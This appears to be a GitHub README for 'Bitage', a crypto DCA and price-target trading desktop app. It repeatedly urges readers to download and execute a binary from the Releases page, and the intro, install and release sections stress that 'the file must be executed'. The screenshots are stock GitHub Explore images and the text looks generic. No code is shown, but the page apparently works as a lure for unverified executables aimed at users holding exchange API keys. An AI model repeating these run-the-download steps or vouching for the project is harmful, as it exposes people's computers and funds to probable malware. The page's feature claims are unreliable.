[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/gieco1237/bitage/releases)

# Bitage — Python Desktop App for DCA and Price-Target Selling

[![PyPI - Python](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Topics](https://img.shields.io/badge/topics-crypto%20%7C%20dca%20%7C%20trading-blueviolet)](https://github.com/gieco1237/bitage)
![SQLite](https://img.shields.io/badge/sqlite-supported-orange)
![Tkinter](https://img.shields.io/badge/gui-Tkinter-lightgrey)

![Hero Image](https://raw.githubusercontent.com/github/explore/main/topics/cryptocurrency/cryptocurrency.png)

Bitage is a desktop application that helps you run and manage rule-based crypto investment strategies. It focuses on Dollar-Cost Averaging (DCA), price-target selling, automation, and simple strategy tracking. The app uses a Tkinter GUI, stores state in SQLite, and pulls live market data for order triggers and reports.

Download the latest release file from the Releases page and execute the package or installer: https://github.com/gieco1237/bitage/releases. The release file needs to be downloaded and executed.

Contents
- Features
- Why use Bitage
- Screenshots
- Requirements
- Install and run
- Quick start: create a DCA plan
- Strategy types
- Database and data model
- Market data and exchanges
- Automation and scheduler
- Logs and reporting
- Configuration
- Testing and simulation
- Contributing
- License
- FAQ
- Troubleshooting

Features
- DCA schedules (fixed amount, fixed qty, calendar-based)
- Price-target sell orders (single and tiered targets)
- GUI controls to create, edit, and monitor strategies
- Real-time market price feed (CoinGecko / CCXT adapters)
- Local SQLite database for persistent state
- Manual and automated execution modes
- Simulation mode for backtesting strategies on historical data
- CSV import/export of transaction history
- Simple charts and strategy performance summary
- Lightweight: pure Python, Tkinter UI, minimal dependencies

Why use Bitage
- Focus on rule-based investing. You define rules. Bitage runs them.
- Local first: your keys and data stay on your machine.
- Transparent logic: strategies map to simple steps you can read in the UI.
- Good for hands-off DCA and setting price-exit rules across coins.

Screenshots
![Main Window](https://raw.githubusercontent.com/github/explore/main/topics/desktop/desktop.png)
![Strategy Builder](https://raw.githubusercontent.com/github/explore/main/topics/automation/automation.png)

Requirements
- Python 3.8 or newer
- pip
- Internet access for live prices
- Optional: exchange API keys (for live trading with supported brokers)

Install and run

1) From source (recommended for development)
- Clone the repo:
  git clone https://github.com/gieco1237/bitage.git
  cd bitage
- Create a virtual environment:
  python -m venv venv
  source venv/bin/activate  # macOS / Linux
  venv\Scripts\activate     # Windows
- Install dependencies:
  pip install -r requirements.txt
- Start the app:
  python -m bitage.app

2) Use a release build (GUI package or installer)
- Visit the Releases page and download the latest packaged file:
  https://github.com/gieco1237/bitage/releases
- Run the downloaded installer or executable for your platform. The downloaded file must be executed to install or run the app.

3) Optional: bundle with PyInstaller for a single exe
- Build:
  pip install pyinstaller
  pyinstaller --onefile --windowed bitage/app.py
- Run the generated binary in dist/.

Quick start: create a DCA plan
1. Launch Bitage.
2. Click New Strategy.
3. Select DCA.
4. Enter coin symbol (e.g., BTC).
5. Choose amount per interval (USD) or amount per buy (coin).
6. Set cadence (daily, weekly, monthly) and start date.
7. Optionally set a stop date or max buys.
8. Enable automation if you want the scheduler to run buys automatically.

Strategy types
- DCA Fixed-USD: buy a fixed USD value on each tick.
- DCA Fixed-Qty: buy a fixed coin quantity on each tick.
- Laddered Entry: split a target allocation across price bands.
- Price-Target Sell: set one or several sell targets with percent or absolute values.
- Hybrid: combine DCA buys with conditional sells.

Database and data model
- Storage: SQLite (file: bitage.db)
- Key tables:
  - strategies: metadata and schedule
  - orders: executed buys and sells
  - targets: price target rules linked to strategies
  - market_cache: recent prices to reduce API calls
- Schema is simple SQL. Use any SQLite viewer to inspect data.

Market data and exchanges
- Market adapters:
  - CoinGecko (no API key needed, good for many coins)
  - CCXT-backed adapters for live exchange prices and order placement
- Exchange adapters map to a common interface:
  - get_ticker(symbol)
  - place_order(side, symbol, qty_or_amount)
  - get_balance()
- Rate limits: the app caches prices and respects public API limits. Use API keys and private exchange endpoints for live trading.

Automation and scheduler
- The scheduler runs in the background and checks pending tasks every minute.
- In automation mode the app:
  - evaluates DCA schedule triggers
  - checks price-target triggers
  - submits simulated or live orders
- You can toggle automation per strategy.

Logs and reporting
- Logs:
  - Rolling logs are stored in logs/bitage.log
  - CSV export for transaction history is available via the UI
- Reports:
  - P&L by strategy
  - Realized vs unrealized gains
  - Chart of buy points and sell exits

Configuration
- Config file: config.yaml or config.json in the app folder
- Common settings:
  - default_fiat: USD
  - api_providers: list and priorities
  - simulator_mode: true | false
  - db_path: path to SQLite file
  - log_level: INFO | DEBUG
- Example config snippet:
  {
    "default_fiat": "USD",
    "api_providers": ["coingecko", "binance"],
    "simulator_mode": true,
    "db_path": "bitage.db",
    "log_level": "INFO"
  }

Testing and simulation
- Simulator mode uses historical data and does not place live trades.
- Use simulation for:
  - validating a DCA cadence
  - testing price-target exits
  - checking edge cases such as partial fills
- Backtest step:
  1. Switch to simulation mode.
  2. Create a strategy.
  3. Use the Historical Data panel to set a time range.
  4. Run simulation and review results.

Security and keys
- Exchange API keys stored locally in encrypted form (optional).
- The app does not transmit keys except to the selected exchange when placing orders.
- For development, use the simulator or exchange testnets.

Contributing
- Fork the repo.
- Create a feature branch.
- Add tests for new features.
- Open a pull request with a clear description.
- Coding style:
  - Follow PEP8
  - Keep functions short
  - Favor small, testable modules
- Tests use pytest. Run:
  pip install -r requirements-dev.txt
  pytest

Release downloads
- Download the packaged releases and run the installer or exe from the Releases page: https://github.com/gieco1237/bitage/releases. The downloaded file needs to be executed to install or run the app.

FAQ
Q: Can I use Bitage with my exchange account?
A: Yes. Add your API keys in Settings and choose the exchange adapter. Test with testnet mode before live orders.

Q: Does Bitage support multiple coins per strategy?
A: Each strategy targets a single symbol. Use multiple strategies to cover several coins.

Q: How does the app handle failed orders?
A: The app logs failures and retries according to the configured retry policy. You can view failed orders in the Orders panel.

Q: Can I export my data?
A: Yes. Export transactions and reports as CSV.

Troubleshooting
- App fails to start:
  - Confirm Python 3.8+ and installed requirements.
  - Check logs/logfile for errors.
- Live prices stale:
  - Verify internet connection.
  - Check market adapter priority in config.
- SQLite locked:
  - Close other apps that may use the DB.
  - Use PRAGMA journal_mode=wal in advanced settings.

Roadmap
- Add multi-exchange order routing.
- Add advanced order types and partial fill handling.
- Add scheduled reporting emails.
- Add portfolio rebalancing tools.

Credits
- GUI: Tkinter
- Market data: CoinGecko, CCXT adapters
- DB: SQLite
- Icons and images from public GitHub Explore assets

License
- MIT License. See LICENSE file.

Contact
- Issues and feature requests: use the GitHub Issues tab.
- For binaries and installers: check Releases: https://github.com/gieco1237/bitage/releases

Developer notes
- Core package layout:
  - bitage/app.py — entry point
  - bitage/gui/ — Tkinter UI modules
  - bitage/core/ — strategy logic and scheduler
  - bitage/adapters/ — market and exchange adapters
  - bitage/db/ — SQLite schema and helpers

Example commands
- Run UI:
  python -m bitage.app
- Run tests:
  pytest tests/

Short checklist before enabling live trading
- Back up your DB.
- Test strategies in simulator.
- Verify API keys and permissions.
- Enable automation per strategy only after tests pass.